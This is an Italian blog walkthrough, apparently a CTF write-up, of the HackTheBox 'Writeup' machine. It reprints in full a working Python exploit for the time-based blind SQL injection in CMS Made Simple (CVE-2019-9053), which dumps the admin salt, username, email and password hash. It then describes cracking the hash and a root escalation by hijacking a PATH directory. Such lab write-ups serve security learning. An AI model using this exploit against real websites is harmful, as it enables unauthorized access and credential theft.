<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	
	<title>Writeup - HackTheBox</title>
	
	<meta name="description" content="">
	<meta name="image" content="">
	
	<meta itemprop="name" content="Writeup - HackTheBox">
	<meta itemprop="description" content="">
	<meta itemprop="image" content="">
	
	<meta name="og:title" content="Writeup - HackTheBox">
	<meta name="og:description" content="">
	
	<meta name="og:url" content="https://samirettali.com/posts/2019-07-05-writeup/">
	<meta name="og:site_name" content="Writeup - HackTheBox">
	<meta name="og:type" content="article">
	
	<meta name="article:tag" content="">
	<link rel="stylesheet" type="text/css" href="https://samirettali.com/css/style.css">
	
	
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-123-45', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>

</head>

<body>

<header>
	
	<a href="https://samirettali.com/" style="float: left;color:#ff3b30;">SE</a>
	
	&nbsp;&nbsp;<a href="https://samirettali.com/archives/" style="color:#777;">Archives</a>&nbsp;&nbsp;
	
	<a href="https://samirettali.com/posts/index.xml" style="color:#777;float: right;"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
</header>


<div class="content">
  <h1>Writeup - HackTheBox</h1>
  <aside></aside>
  <p>

<p>Writeup è una macchina Linux su HackTheBox da 20 punti.</p>

<p><img src="/images/htb-writeup/writeup.png" alt="Writeup" /></p>

<p>Iniziamo con un rapido scan delle porte:</p>

<p><img src="/images/htb-writeup/nmap.png" alt="Writeup" /></p>

<p>Notiamo che c&rsquo;è un web server in esecuzione sulla macchina, visitiamolo:
<img src="/images/htb-writeup/writeup-web.png" alt="Pagina web" /></p>

<p>Il codice sorgente non contiene niente di interessante, visitiamo la directory
<code>/writeup</code> contenuta nel risultato dello scan di nmap:
<img src="/images/htb-writeup/writeup-dir.png" alt="Writeup directory" /></p>

<p>I link nella pagina portano ai seguenti URL:</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">http://10.10.10.138/writeup/index.php?page=ypuffy
http://10.10.10.138/writeup/index.php?page=blue
http://10.10.10.138/writeup/index.php?page=writeup</pre></div>
<p>che contengono solamente del testo.</p>

<p>Proviamo allora a lavorare sul parametro page. Inserendo come valore del
parametro un&rsquo;apice</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">http://10.10.10.138/writeup/index.php?page=&#39;</pre></div>
<p>otteniamo una pagina 404 come risposta.</p>

<p><img src="/images/htb-writeup/404.png" alt="404" /></p>

<p>Provando con</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">http://10.10.10.138/writeup/index.php?page=/etc/passwd</pre></div>
<p>otteniamo lo stesso risultato.</p>

<p>Facciamo un passo indietro e vediamo se
<a href="/images/htb-writeup/https://www.wappalyzer.com/">Wappalyzer</a> (possiamo usare il plugin da browser)
ci dà qualche informazione in più. Scopriamo infatti che questa parte di sito è
realizzata tramite CMS Made Simple.</p>

<p><img src="/images/htb-writeup/wappalyzer.png" alt="Wappalyzer" /></p>

<p>Facendo una ricerca su internet troviamo che CMS Made Simple è vulnerabile a SQL
Injection. Vediamo il codice dell&rsquo;exploit:</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#408080;font-style:italic">#!/usr/bin/env python</span>
<span style="color:#408080;font-style:italic"># Exploit Title: Unauthenticated SQL Injection on CMS Made Simple &lt;= 2.2.9</span>
<span style="color:#408080;font-style:italic"># Date: 30-03-2019</span>
<span style="color:#408080;font-style:italic"># Exploit Author: Daniele Scanu @ Certimeter Group</span>
<span style="color:#408080;font-style:italic"># Vendor Homepage: https://www.cmsmadesimple.org/</span>
<span style="color:#408080;font-style:italic"># Software Link: https://www.cmsmadesimple.org/downloads/cmsms/</span>
<span style="color:#408080;font-style:italic"># Version: &lt;= 2.2.9</span>
<span style="color:#408080;font-style:italic"># Tested on: Ubuntu 18.04 LTS</span>
<span style="color:#408080;font-style:italic"># CVE : CVE-2019-9053</span>

<span style="color:#008000;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">requests</span>
<span style="color:#008000;font-weight:bold">from</span> <span style="color:#00f;font-weight:bold">termcolor</span> <span style="color:#008000;font-weight:bold">import</span> colored
<span style="color:#008000;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">time</span>
<span style="color:#008000;font-weight:bold">from</span> <span style="color:#00f;font-weight:bold">termcolor</span> <span style="color:#008000;font-weight:bold">import</span> cprint
<span style="color:#008000;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">optparse</span>
<span style="color:#008000;font-weight:bold">import</span> <span style="color:#00f;font-weight:bold">hashlib</span>

parser <span style="color:#666">=</span> optparse<span style="color:#666">.</span>OptionParser()
parser<span style="color:#666">.</span>add_option(<span style="color:#ba2121">&#39;-u&#39;</span>, <span style="color:#ba2121">&#39;--url&#39;</span>, action<span style="color:#666">=</span><span style="color:#ba2121">&#34;store&#34;</span>, dest<span style="color:#666">=</span><span style="color:#ba2121">&#34;url&#34;</span>, help<span style="color:#666">=</span><span style="color:#ba2121">&#34;Base target uri (ex. http://10.10.10.100/cms)&#34;</span>)
parser<span style="color:#666">.</span>add_option(<span style="color:#ba2121">&#39;-w&#39;</span>, <span style="color:#ba2121">&#39;--wordlist&#39;</span>, action<span style="color:#666">=</span><span style="color:#ba2121">&#34;store&#34;</span>, dest<span style="color:#666">=</span><span style="color:#ba2121">&#34;wordlist&#34;</span>, help<span style="color:#666">=</span><span style="color:#ba2121">&#34;Wordlist for crack admin password&#34;</span>)
parser<span style="color:#666">.</span>add_option(<span style="color:#ba2121">&#39;-c&#39;</span>, <span style="color:#ba2121">&#39;--crack&#39;</span>, action<span style="color:#666">=</span><span style="color:#ba2121">&#34;store_true&#34;</span>, dest<span style="color:#666">=</span><span style="color:#ba2121">&#34;cracking&#34;</span>, help<span style="color:#666">=</span><span style="color:#ba2121">&#34;Crack password with wordlist&#34;</span>, default<span style="color:#666">=</span>False)

options, args <span style="color:#666">=</span> parser<span style="color:#666">.</span>parse_args()
<span style="color:#008000;font-weight:bold">if</span> <span style="color:#a2f;font-weight:bold">not</span> options<span style="color:#666">.</span>url:
    <span style="color:#008000;font-weight:bold">print</span> <span style="color:#ba2121">&#34;[+] Specify an url target&#34;</span>
    <span style="color:#008000;font-weight:bold">print</span> <span style="color:#ba2121">&#34;[+] Example usage (no cracking password): exploit.py -u http://target-uri&#34;</span>
    <span style="color:#008000;font-weight:bold">print</span> <span style="color:#ba2121">&#34;[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist&#34;</span>
    <span style="color:#008000;font-weight:bold">print</span> <span style="color:#ba2121">&#34;[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.&#34;</span>
    <span style="color:#008000">exit</span>()

url_vuln <span style="color:#666">=</span> options<span style="color:#666">.</span>url <span style="color:#666">+</span> <span style="color:#ba2121">&#39;/moduleinterface.php?mact=News,m1_,default,0&#39;</span>
session <span style="color:#666">=</span> requests<span style="color:#666">.</span>Session()
dictionary <span style="color:#666">=</span> <span style="color:#ba2121">&#39;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$&#39;</span>
flag <span style="color:#666">=</span> True
password <span style="color:#666">=</span> <span style="color:#ba2121">&#34;&#34;</span>
temp_password <span style="color:#666">=</span> <span style="color:#ba2121">&#34;&#34;</span>
TIME <span style="color:#666">=</span> <span style="color:#666">1</span>
db_name <span style="color:#666">=</span> <span style="color:#ba2121">&#34;&#34;</span>
output <span style="color:#666">=</span> <span style="color:#ba2121">&#34;&#34;</span>
email <span style="color:#666">=</span> <span style="color:#ba2121">&#34;&#34;</span>

salt <span style="color:#666">=</span> <span style="color:#ba2121">&#39;&#39;</span>
wordlist <span style="color:#666">=</span> <span style="color:#ba2121">&#34;&#34;</span>
<span style="color:#008000;font-weight:bold">if</span> options<span style="color:#666">.</span>wordlist:
    wordlist <span style="color:#666">+=</span> options<span style="color:#666">.</span>wordlist

<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">crack_password</span>():
    <span style="color:#008000;font-weight:bold">global</span> password
    <span style="color:#008000;font-weight:bold">global</span> output
    <span style="color:#008000;font-weight:bold">global</span> wordlist
    <span style="color:#008000;font-weight:bold">global</span> salt
    <span style="color:#008000">dict</span> <span style="color:#666">=</span> <span style="color:#008000">open</span>(wordlist)
    <span style="color:#008000;font-weight:bold">for</span> line <span style="color:#a2f;font-weight:bold">in</span> <span style="color:#008000">dict</span><span style="color:#666">.</span>readlines():
        line <span style="color:#666">=</span> line<span style="color:#666">.</span>replace(<span style="color:#ba2121">&#34;</span><span style="color:#b62;font-weight:bold">\n</span><span style="color:#ba2121">&#34;</span>, <span style="color:#ba2121">&#34;&#34;</span>)
        beautify_print_try(line)
        <span style="color:#008000;font-weight:bold">if</span> hashlib<span style="color:#666">.</span>md5(<span style="color:#008000">str</span>(salt) <span style="color:#666">+</span> line)<span style="color:#666">.</span>hexdigest() <span style="color:#666">==</span> password:
            output <span style="color:#666">+=</span> <span style="color:#ba2121">&#34;</span><span style="color:#b62;font-weight:bold">\n</span><span style="color:#ba2121">[+] Password cracked: &#34;</span> <span style="color:#666">+</span> line
            <span style="color:#008000;font-weight:bold">break</span>
    <span style="color:#008000">dict</span><span style="color:#666">.</span>close()

<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">beautify_print_try</span>(value):
    <span style="color:#008000;font-weight:bold">global</span> output
    <span style="color:#008000;font-weight:bold">print</span> <span style="color:#ba2121">&#34;</span><span style="color:#b62;font-weight:bold">\033</span><span style="color:#ba2121">c&#34;</span>
    cprint(output,<span style="color:#ba2121">&#39;green&#39;</span>, attrs<span style="color:#666">=</span>[<span style="color:#ba2121">&#39;bold&#39;</span>])
    cprint(<span style="color:#ba2121">&#39;[*] Try: &#39;</span> <span style="color:#666">+</span> value, <span style="color:#ba2121">&#39;red&#39;</span>, attrs<span style="color:#666">=</span>[<span style="color:#ba2121">&#39;bold&#39;</span>])

<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">beautify_print</span>():
    <span style="color:#008000;font-weight:bold">global</span> output
    <span style="color:#008000;font-weight:bold">print</span> <span style="color:#ba2121">&#34;</span><span style="color:#b62;font-weight:bold">\033</span><span style="color:#ba2121">c&#34;</span>
    cprint(output,<span style="color:#ba2121">&#39;green&#39;</span>, attrs<span style="color:#666">=</span>[<span style="color:#ba2121">&#39;bold&#39;</span>])

<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">dump_salt</span>():
    <span style="color:#008000;font-weight:bold">global</span> flag
    <span style="color:#008000;font-weight:bold">global</span> salt
    <span style="color:#008000;font-weight:bold">global</span> output
    ord_salt <span style="color:#666">=</span> <span style="color:#ba2121">&#34;&#34;</span>
    ord_salt_temp <span style="color:#666">=</span> <span style="color:#ba2121">&#34;&#34;</span>
    <span style="color:#008000;font-weight:bold">while</span> flag:
        flag <span style="color:#666">=</span> False
        <span style="color:#008000;font-weight:bold">for</span> i <span style="color:#a2f;font-weight:bold">in</span> <span style="color:#008000">range</span>(<span style="color:#666">0</span>, <span style="color:#008000">len</span>(dictionary)):
            temp_salt <span style="color:#666">=</span> salt <span style="color:#666">+</span> dictionary[i]
            ord_salt_temp <span style="color:#666">=</span> ord_salt <span style="color:#666">+</span> <span style="color:#008000">hex</span>(<span style="color:#008000">ord</span>(dictionary[i]))[<span style="color:#666">2</span>:]
            beautify_print_try(temp_salt)
            payload <span style="color:#666">=</span> <span style="color:#ba2121">&#34;a,b,1,5))+and+(select+sleep(&#34;</span> <span style="color:#666">+</span> <span style="color:#008000">str</span>(TIME) <span style="color:#666">+</span> <span style="color:#ba2121">&#34;)+from+cms_siteprefs+where+sitepref_value+like+0x&#34;</span> <span style="color:#666">+</span> ord_salt_temp <span style="color:#666">+</span> <span style="color:#ba2121">&#34;25+and+sitepref_name+like+0x736974656d61736b)+--+&#34;</span>
            url <span style="color:#666">=</span> url_vuln <span style="color:#666">+</span> <span style="color:#ba2121">&#34;&amp;m1_idlist=&#34;</span> <span style="color:#666">+</span> payload
            start_time <span style="color:#666">=</span> time<span style="color:#666">.</span>time()
            r <span style="color:#666">=</span> session<span style="color:#666">.</span>get(url)
            elapsed_time <span style="color:#666">=</span> time<span style="color:#666">.</span>time() <span style="color:#666">-</span> start_time
            <span style="color:#008000;font-weight:bold">if</span> elapsed_time <span style="color:#666">&gt;=</span> TIME:
                flag <span style="color:#666">=</span> True
                <span style="color:#008000;font-weight:bold">break</span>
        <span style="color:#008000;font-weight:bold">if</span> flag:
            salt <span style="color:#666">=</span> temp_salt
            ord_salt <span style="color:#666">=</span> ord_salt_temp
    flag <span style="color:#666">=</span> True
    output <span style="color:#666">+=</span> <span style="color:#ba2121">&#39;</span><span style="color:#b62;font-weight:bold">\n</span><span style="color:#ba2121">[+] Salt for password found: &#39;</span> <span style="color:#666">+</span> salt

<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">dump_password</span>():
    <span style="color:#008000;font-weight:bold">global</span> flag
    <span style="color:#008000;font-weight:bold">global</span> password
    <span style="color:#008000;font-weight:bold">global</span> output
    ord_password <span style="color:#666">=</span> <span style="color:#ba2121">&#34;&#34;</span>
    ord_password_temp <span style="color:#666">=</span> <span style="color:#ba2121">&#34;&#34;</span>
    <span style="color:#008000;font-weight:bold">while</span> flag:
        flag <span style="color:#666">=</span> False
        <span style="color:#008000;font-weight:bold">for</span> i <span style="color:#a2f;font-weight:bold">in</span> <span style="color:#008000">range</span>(<span style="color:#666">0</span>, <span style="color:#008000">len</span>(dictionary)):
            temp_password <span style="color:#666">=</span> password <span style="color:#666">+</span> dictionary[i]
            ord_password_temp <span style="color:#666">=</span> ord_password <span style="color:#666">+</span> <span style="color:#008000">hex</span>(<span style="color:#008000">ord</span>(dictionary[i]))[<span style="color:#666">2</span>:]
            beautify_print_try(temp_password)
            payload <span style="color:#666">=</span> <span style="color:#ba2121">&#34;a,b,1,5))+and+(select+sleep(&#34;</span> <span style="color:#666">+</span> <span style="color:#008000">str</span>(TIME) <span style="color:#666">+</span> <span style="color:#ba2121">&#34;)+from+cms_users&#34;</span>
            payload <span style="color:#666">+=</span> <span style="color:#ba2121">&#34;+where+password+like+0x&#34;</span> <span style="color:#666">+</span> ord_password_temp <span style="color:#666">+</span> <span style="color:#ba2121">&#34;25+and+user_id+like+0x31)+--+&#34;</span>
            url <span style="color:#666">=</span> url_vuln <span style="color:#666">+</span> <span style="color:#ba2121">&#34;&amp;m1_idlist=&#34;</span> <span style="color:#666">+</span> payload
            start_time <span style="color:#666">=</span> time<span style="color:#666">.</span>time()
            r <span style="color:#666">=</span> session<span style="color:#666">.</span>get(url)
            elapsed_time <span style="color:#666">=</span> time<span style="color:#666">.</span>time() <span style="color:#666">-</span> start_time
            <span style="color:#008000;font-weight:bold">if</span> elapsed_time <span style="color:#666">&gt;=</span> TIME:
                flag <span style="color:#666">=</span> True
                <span style="color:#008000;font-weight:bold">break</span>
        <span style="color:#008000;font-weight:bold">if</span> flag:
            password <span style="color:#666">=</span> temp_password
            ord_password <span style="color:#666">=</span> ord_password_temp
    flag <span style="color:#666">=</span> True
    output <span style="color:#666">+=</span> <span style="color:#ba2121">&#39;</span><span style="color:#b62;font-weight:bold">\n</span><span style="color:#ba2121">[+] Password found: &#39;</span> <span style="color:#666">+</span> password

<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">dump_username</span>():
    <span style="color:#008000;font-weight:bold">global</span> flag
    <span style="color:#008000;font-weight:bold">global</span> db_name
    <span style="color:#008000;font-weight:bold">global</span> output
    ord_db_name <span style="color:#666">=</span> <span style="color:#ba2121">&#34;&#34;</span>
    ord_db_name_temp <span style="color:#666">=</span> <span style="color:#ba2121">&#34;&#34;</span>
    <span style="color:#008000;font-weight:bold">while</span> flag:
        flag <span style="color:#666">=</span> False
        <span style="color:#008000;font-weight:bold">for</span> i <span style="color:#a2f;font-weight:bold">in</span> <span style="color:#008000">range</span>(<span style="color:#666">0</span>, <span style="color:#008000">len</span>(dictionary)):
            temp_db_name <span style="color:#666">=</span> db_name <span style="color:#666">+</span> dictionary[i]
            ord_db_name_temp <span style="color:#666">=</span> ord_db_name <span style="color:#666">+</span> <span style="color:#008000">hex</span>(<span style="color:#008000">ord</span>(dictionary[i]))[<span style="color:#666">2</span>:]
            beautify_print_try(temp_db_name)
            payload <span style="color:#666">=</span> <span style="color:#ba2121">&#34;a,b,1,5))+and+(select+sleep(&#34;</span> <span style="color:#666">+</span> <span style="color:#008000">str</span>(TIME) <span style="color:#666">+</span> <span style="color:#ba2121">&#34;)+from+cms_users+where+username+like+0x&#34;</span> <span style="color:#666">+</span> ord_db_name_temp <span style="color:#666">+</span> <span style="color:#ba2121">&#34;25+and+user_id+like+0x31)+--+&#34;</span>
            url <span style="color:#666">=</span> url_vuln <span style="color:#666">+</span> <span style="color:#ba2121">&#34;&amp;m1_idlist=&#34;</span> <span style="color:#666">+</span> payload
            start_time <span style="color:#666">=</span> time<span style="color:#666">.</span>time()
            r <span style="color:#666">=</span> session<span style="color:#666">.</span>get(url)
            elapsed_time <span style="color:#666">=</span> time<span style="color:#666">.</span>time() <span style="color:#666">-</span> start_time
            <span style="color:#008000;font-weight:bold">if</span> elapsed_time <span style="color:#666">&gt;=</span> TIME:
                flag <span style="color:#666">=</span> True
                <span style="color:#008000;font-weight:bold">break</span>
        <span style="color:#008000;font-weight:bold">if</span> flag:
            db_name <span style="color:#666">=</span> temp_db_name
            ord_db_name <span style="color:#666">=</span> ord_db_name_temp
    output <span style="color:#666">+=</span> <span style="color:#ba2121">&#39;</span><span style="color:#b62;font-weight:bold">\n</span><span style="color:#ba2121">[+] Username found: &#39;</span> <span style="color:#666">+</span> db_name
    flag <span style="color:#666">=</span> True

<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">dump_email</span>():
    <span style="color:#008000;font-weight:bold">global</span> flag
    <span style="color:#008000;font-weight:bold">global</span> email
    <span style="color:#008000;font-weight:bold">global</span> output
    ord_email <span style="color:#666">=</span> <span style="color:#ba2121">&#34;&#34;</span>
    ord_email_temp <span style="color:#666">=</span> <span style="color:#ba2121">&#34;&#34;</span>
    <span style="color:#008000;font-weight:bold">while</span> flag:
        flag <span style="color:#666">=</span> False
        <span style="color:#008000;font-weight:bold">for</span> i <span style="color:#a2f;font-weight:bold">in</span> <span style="color:#008000">range</span>(<span style="color:#666">0</span>, <span style="color:#008000">len</span>(dictionary)):
            temp_email <span style="color:#666">=</span> email <span style="color:#666">+</span> dictionary[i]
            ord_email_temp <span style="color:#666">=</span> ord_email <span style="color:#666">+</span> <span style="color:#008000">hex</span>(<span style="color:#008000">ord</span>(dictionary[i]))[<span style="color:#666">2</span>:]
            beautify_print_try(temp_email)
            payload <span style="color:#666">=</span> <span style="color:#ba2121">&#34;a,b,1,5))+and+(select+sleep(&#34;</span> <span style="color:#666">+</span> <span style="color:#008000">str</span>(TIME) <span style="color:#666">+</span> <span style="color:#ba2121">&#34;)+from+cms_users+where+email+like+0x&#34;</span> <span style="color:#666">+</span> ord_email_temp <span style="color:#666">+</span> <span style="color:#ba2121">&#34;25+and+user_id+like+0x31)+--+&#34;</span>
            url <span style="color:#666">=</span> url_vuln <span style="color:#666">+</span> <span style="color:#ba2121">&#34;&amp;m1_idlist=&#34;</span> <span style="color:#666">+</span> payload
            start_time <span style="color:#666">=</span> time<span style="color:#666">.</span>time()
            r <span style="color:#666">=</span> session<span style="color:#666">.</span>get(url)
            elapsed_time <span style="color:#666">=</span> time<span style="color:#666">.</span>time() <span style="color:#666">-</span> start_time
            <span style="color:#008000;font-weight:bold">if</span> elapsed_time <span style="color:#666">&gt;=</span> TIME:
                flag <span style="color:#666">=</span> True
                <span style="color:#008000;font-weight:bold">break</span>
        <span style="color:#008000;font-weight:bold">if</span> flag:
            email <span style="color:#666">=</span> temp_email
            ord_email <span style="color:#666">=</span> ord_email_temp
    output <span style="color:#666">+=</span> <span style="color:#ba2121">&#39;</span><span style="color:#b62;font-weight:bold">\n</span><span style="color:#ba2121">[+] Email found: &#39;</span> <span style="color:#666">+</span> email
    flag <span style="color:#666">=</span> True

dump_salt()
dump_username()
dump_email()
dump_password()

<span style="color:#008000;font-weight:bold">if</span> options<span style="color:#666">.</span>cracking:
    <span style="color:#008000;font-weight:bold">print</span> colored(<span style="color:#ba2121">&#34;[*] Now try to crack password&#34;</span>)
    crack_password()

beautify_print()</code></pre></div>
<p>La vulnerabilità specifica di cui fa uso l&rsquo;exploit si chiama Time Based Blind
SQL Injection, e sfrutta la funzione <code>SLEEP</code> per introdurre un ritardo nel caso in
cui le condizioni della query siano corrette. Trovate un approfondimento <a href="http://www.sqlinjection.net/time-based/">qui</a>.</p>

<p>Eseguiamo allora l&rsquo;exploit:
<img src="/images/htb-writeup/sql.gif" alt="SQL" /></p>

<p>L&rsquo;exploit ha trovato lo username, l&rsquo;hash della password e il salt usato per
l&rsquo;hash dell&rsquo;utente del pannello di amministrazione. Il formato dell&rsquo;hash della
password è MD5($SALT.$PASSWORD), usiamo allora hashcat in modalità dictionary
attack usando la wordlist <a href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt">rockyou</a>:
<img src="/images/htb-writeup/hashcat.png" alt="hashcat" /></p>

<p>Quando hashcat finisce vediamo il risultato con questo comando:
<img src="/images/htb-writeup/hashcat2.png" alt="hashcat" /></p>

<p>Proviamo ad usare i dati trovati per accedere tramite ssh:
<img src="/images/htb-writeup/ssh.png" alt="ssh" /></p>

<h1 id="root-privilege-escalation">Root - Privilege escalation</h1>

<p>Adesso dobbiamo fare privilege escalation per diventare root. Uno dei primi tool
che in genere si utilizzano è <a href="https://github.com/rebootuser/LinEnum">LinEnum</a>,
che fa un&rsquo;enumerazione generale del sistema. Deve essere eseguito sulla macchina
che si vuole analizzare, però le macchine di HackTheBox non hanno accesso a
internet. Cloniamo allora il repository sul nostro computer e copiamo il file
con scp:
<img src="/images/htb-writeup/scp.png" alt="scp" /></p>

<p>Eseguendolo sulla macchina non troviamo niente di interessante. Facciamo la
stessa cosa con <a href="https://github.com/DominicBreuker/pspy">pspy</a>, un tool per
monitorare i processi.</p>

<p>Notiamo che ogni minuto viene eseguito lo script cleanup.pl.
<img src="/images/htb-writeup/pspy.png" alt="pspy" /></p>

<p>Aspettando ancora non succede niente. Provando a connetterci con un altra
sessione ssh vediamo che viene eseguito il comando</p>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sh -c /usr/bin/env -i <span style="color:#19177c">PATH</span><span style="color:#666">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin: <span style="color:#b62;font-weight:bold">\
</span><span style="color:#b62;font-weight:bold"></span>/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new</code></pre></div>
<p><img src="/images/htb-writeup/pspy2.png" alt="pspy2" /></p>

<p>Il comando <code>run-parts</code> esegue tutti i file presenti nella
directory indicata e l&rsquo;output viene rediretto in <code>/run/motd.dynamic.new</code>.
Vediamo allora i permessi della directory contenente gli scripts e il loro
contenuto:
<img src="/images/htb-writeup/update-motd.png" alt="update-motd" /></p>

<p>Lo script esegue il comando uname con alcuni parametri. Vediamo però che il
comando run-parts viene chiamato anteponendo il comando <code>env -i</code>, che serve a
ignorare le variabili di ambiente. Viene inoltre definita la variabile di
ambiente <code>PATH</code>.  L&rsquo;eseguibile <code>uname</code> viene cercato in tutte le directory a
partire dalla prima. Vediamo se possiamo scrivere in una delle directory che
vengono usate.
<img src="/images/htb-writeup/sbin.png" alt="sbin" /></p>

<p>Abbiamo fortuna già con la prima! Scriviamo allora uno script in quella
directory e chiamiamolo uname:
<img src="/images/htb-writeup/uname.png" alt="uname" /></p>

<p>Salviamolo e diamogli i permessi di esecuzione con <code>chmod +x</code>. Connettiamoci di
nuovo per far chiamare lo script e stampiamo il contenuto del file:
<img src="/images/htb-writeup/root.png" alt="root" /></p>

<p>Alla prossima!</p>
</p>
</div>


  <p>Written on Jul 15, 2019.</p>


<footer>
	<p>&copy; 2019 All rights reserved.</p>
</footer>
</body>
</html>
